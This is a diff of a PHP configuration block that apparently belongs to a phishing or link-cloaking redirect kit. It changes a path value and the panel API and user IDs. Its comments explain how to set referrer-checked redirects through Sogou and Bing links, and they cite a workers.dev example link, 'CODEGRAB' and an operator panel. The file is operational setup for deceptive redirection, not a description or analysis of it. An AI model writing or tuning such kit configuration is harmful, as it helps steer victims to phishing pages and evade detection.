@@ -12,7 +12,7 @@ define('FAKE_BD_RE',true);
 // EX: https://strongemoreiz.pearly.workers.dev/?bbre=oUfphz#ld-
 $linkRE="";
 // ex: "/pa1/pa2/pa3" or "/path1/patjh2"
-$wordshash="/appap";
+$wordshash="/newapis";
 // config if domain index is root (sogou must config same same link rediret to check rerfer
 // IF NOT use with SOGOU.COM edit $wordshashjs=""
 // config bing: word/a@aa.com on  => $wordshashjs="word/";  ( link use bing/....u=CHAR_OFBING#word/CODEGRAB
@@ -21,10 +21,10 @@ $wordshashjs="";
 $wordshashjs_prefix_hash="predevsz";
 
 // value copy from panel
-define('ID_API_RE',"67b70d9bc2f320ff320889d3");
+define('ID_API_RE',"67e5861fb19d07c12d0ab0b0");
 
 // is username login on ur panel 
-define('ID_USER',"0x67b70969c2f320ff320889d1");
+define('ID_USER',"0x67e583f1b19d07c12d0ab0ad");
 define('PRIVATE_CN',"kute");
 function  has111($str,$content, $type = 1)
    {
